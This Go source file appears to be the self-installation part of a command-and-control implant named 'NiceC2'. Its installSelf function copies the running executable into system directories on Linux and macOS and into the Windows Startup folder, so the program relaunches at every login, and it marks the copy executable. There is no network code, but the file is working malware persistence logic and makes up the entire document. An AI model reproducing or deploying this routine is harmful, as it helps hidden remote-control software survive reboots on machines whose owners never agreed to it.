package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

func main() {

	log.Println("Starting")
	err, destination_path := installSelf()
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println(destination_path)
}

func installSelf() (error, string) {
	// Get the name of the current executable.
	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("could not get executable path: %v", err), ""
	}

	// Determine the default location for background applications based on the operating system.
	var dst string
	switch runtime.GOOS {
	case "linux":
		dst = "/usr/local/bin/NiceC2/"
	case "darwin":
		dst = "/Library/Application Support/NiceC2/"
	case "windows":
		dst = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "NiceC2")
	default:
		return fmt.Errorf("unsupported operating system: %s", runtime.GOOS), ""
	}

	// Creates the directory for NiceC2 to go into
	err1 := os.Mkdir(dst, 0755)
	if err1 != nil {
		fmt.Printf("Error creating directory %s: %s\n", dst, err1)
		return err1, ""
	}

	// Open the destination file for writing.
	dstFile, err := os.Create(filepath.Join(dst, filepath.Base(self)))
	if err != nil {
		return fmt.Errorf("could not create destination file: %v", err), ""
	}
	defer dstFile.Close()

	// Open the source file for reading.
	srcFile, err := os.Open(self)
	if err != nil {
		return fmt.Errorf("could not open source file: %v", err), ""
	}
	defer srcFile.Close()

	// Copy the contents of the source file to the destination file.
	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		fmt.Println("Error copying file")
		return fmt.Errorf("could not copy file: %v", err), ""
	}

	// Set the executable bit on Linux and macOS.
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		err = os.Chmod(filepath.Join(dst, filepath.Base(self)), 0755)
		if err != nil {
			return fmt.Errorf("could not set executable bit: %v", err), ""
		}
	}

	return nil, filepath.Join(dst, filepath.Base(self))
}
